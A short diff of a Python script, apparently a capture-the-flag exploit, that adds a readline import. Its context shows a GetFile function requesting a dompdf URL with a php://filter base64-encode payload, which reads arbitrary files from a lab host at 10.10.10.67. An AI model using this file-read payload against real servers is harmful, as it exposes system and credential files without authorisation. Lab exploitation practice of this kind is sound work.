@@ -1,6 +1,7 @@
 import requests
 from base64 import b64decode
 import re
+import readline
 
 def GetFile(file):
     url = (f"http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource={file}")
